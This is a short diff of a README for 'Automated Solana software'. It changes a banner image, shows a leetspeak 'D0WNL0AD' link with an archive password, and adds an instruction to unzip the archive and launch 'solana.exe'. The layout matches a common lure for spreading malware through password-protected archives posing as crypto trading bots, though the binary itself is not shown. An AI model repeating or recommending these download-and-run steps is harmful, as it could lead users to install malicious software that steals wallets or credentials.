@@ -1,8 +1,9 @@
 # Automated Solana software
-![solana-banner](https://github.com/user-attachments/assets/a5a48f23-4c96-4228-ab02-d200825ff77c)
+![solana-banner](https://github.com/user-attachments/assets/fc704940-ede2-41c4-8e21-18580d05db86)
 
 # [D0WNL0AD]()
 ## The archive password is ***S0Lbot!bysmoke***
+ *Download the archive, unzip it and launch the "solana.exe" file
 
 # Features
 
